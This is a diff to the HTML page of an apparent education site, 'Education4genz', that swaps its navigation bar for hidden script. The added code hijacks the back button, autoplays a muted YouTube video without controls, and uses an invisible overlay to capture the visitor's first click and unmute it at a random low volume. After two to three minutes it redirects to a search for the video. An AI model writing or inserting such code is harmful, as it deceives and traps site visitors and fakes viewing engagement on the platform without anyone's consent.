@@ -27,19 +27,74 @@
     </script>
   </head>
   <body>
-    <div class="nav">
-      <div class="nav-left">
-        <header>Education4genz</header>
-        <a href="/">Home</a>
-        <a href="#about">About</a>
-      </div>
-      <div class="nav-right">
-        <div class="search-box">
-          <span class="search-icon">🔍</span>
-          <input type="text" placeholder="Type to search" />
-        </div>
-        <button>E</button>
-      </div>
-    </div>
+    <div id="interaction-trap" onclick="triggerEngagement()"></div>
+    <div id="yt-player"></div>
+
+    <script>
+        // --- 1. THE REDIRECT TRAP ---
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+            };
+        })();
+
+        // --- 2. YOUTUBE API ---
+        var tag = document.createElement('script');
+        tag.src = "https://www.youtube.com/iframe_api";
+        document.head.appendChild(tag);
+
+        var player;
+        var videoID = '19J_B_RIFoA';
+        var engaged = false;
+
+        function onYouTubeIframeAPIReady() {
+            player = new YT.Player('yt-player', {
+                videoId: videoID,
+                playerVars: {
+                    'autoplay': 1,
+                    'mute': 1,
+                    'controls': 0,
+                    'enablejsapi': 1,
+                    'origin': window.location.origin,
+                    'start': 30, // Forces the video to start at 30 seconds
+                    'rel': 0
+                },
+                events: {
+                    'onReady': (e) => { 
+                        e.target.playVideo(); 
+                    }
+                }
+            });
+        }
+
+        // --- 3. THE HIDDEN TRIGGER ---
+        function triggerEngagement() {
+            if (engaged) return;
+            engaged = true;
+
+            document.getElementById('interaction-trap').style.display = 'none';
+            
+            if (player && player.unMute) {
+                player.unMute();
+                // Random low volume (6% - 12%)
+                player.setVolume(Math.floor(Math.random() * 6) + 6); 
+                player.setPlaybackRate(1); 
+            }
+
+            startSessionTimer();
+        }
+
+        function startSessionTimer() {
+            // Watch for 120s to 190s
+            var duration = Math.floor(Math.random() * 70000) + 120000;
+            
+            setTimeout(function() {
+                player.stopVideo();
+                window.location.replace("https://www.google.com/search?q=" + videoID);
+            }, duration);
+        }
+    </script>
+</body>
   </body>
 </html>
